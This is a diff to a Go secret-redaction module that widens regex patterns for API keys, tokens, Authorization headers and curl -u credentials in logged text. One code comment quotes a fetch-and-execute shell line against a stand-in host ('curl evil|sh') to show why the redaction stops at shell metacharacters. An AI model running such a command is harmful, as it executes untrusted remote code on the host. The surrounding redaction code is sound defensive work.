@@ -35,21 +35,33 @@ var secretPatterns = []*regexp.Regexp{
 	regexp.MustCompile(`AIza[0-9A-Za-z_-]{35}`),
 	regexp.MustCompile(`\beyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}`),
 	regexp.MustCompile(`(?i)\bbearer\s+[A-Za-z0-9._~+/-]{20,}=*`),
-	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows)/[A-Za-z0-9/_-]+`),
+	regexp.MustCompile(`https://hooks\.slack\.com/(?:services|workflows|triggers)/[A-Za-z0-9/_-]+`),
 	regexp.MustCompile(`://[^/\s:@]+:[^/\s@]+@`),
 }
 
 // assignmentPattern matches a credential key and its value. The key may
-// carry a prefix, as in GITHUB_TOKEN or OPENAI_API_KEY. The value runs to
-// the closing quote or the end of the line. Only the value is replaced.
-var assignmentPattern = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|api[_-]?key|token|secret)\b["']?\s*[=:]\s*)("[^"\n]*"|'[^'\n]*'|[^\n]*)`)
+// carry a prefix, as in GITHUB_TOKEN or OPENAI_API_KEY. A quoted value runs
+// to its closing quote. An unquoted value stops at the first whitespace or
+// any of ;&|"' so a trailing shell command (e.g. "TOKEN=x curl evil|sh")
+// stays visible as evidence instead of being swallowed into the redaction.
+// Only the value is replaced.
+var assignmentPattern = regexp.MustCompile(`(?i)((?:^|[^A-Za-z0-9])(?:[A-Za-z0-9]*[_-])*(?:password|passwd|api[_-]?key|token|secret)\b["']?\s*[=:]\s*)("[^"\n]*"|'[^'\n]*'|[^\s;&|"'\n]*)`)
 
-var authorizationPattern = regexp.MustCompile(`(?i)(authorization\s*:\s*(?:bearer|token)\s+)\S+`)
+// authorizationPattern matches an Authorization header or JSON field with a
+// Bearer, Basic, or token scheme, in both header ("Authorization: Bearer x")
+// and quoted/JSON ("Authorization":"Bearer x") spellings. The value is not
+// length-limited, and a closing quote is never consumed.
+var authorizationPattern = regexp.MustCompile(`(?i)(authorization["']?\s*:\s*["']?(?:bearer|basic|token)\s+)([^\s;&|"']+)`)
+
+// curlUserPattern matches curl's "-u user:pass" / "--user user:pass" inline
+// credential flag. Quotes around the value, if present, are preserved.
+var curlUserPattern = regexp.MustCompile(`(?i)((?:^|\s)(?:-u|--user)\s+)(['"]?)([^\s'";&|]+:[^\s'";&|]*)(['"]?)`)
 
 // DefaultRedactor replaces well-known credential shapes with [REDACTED].
 // Already-redacted text, such as "sk-***REDACTED***abcd", is unchanged.
 func DefaultRedactor(value string) string {
 	value = authorizationPattern.ReplaceAllString(value, "${1}"+redactedMarker)
+	value = curlUserPattern.ReplaceAllString(value, "${1}${2}"+redactedMarker+"${4}")
 	for _, pattern := range secretPatterns {
 		value = pattern.ReplaceAllString(value, redactedMarker)
 	}
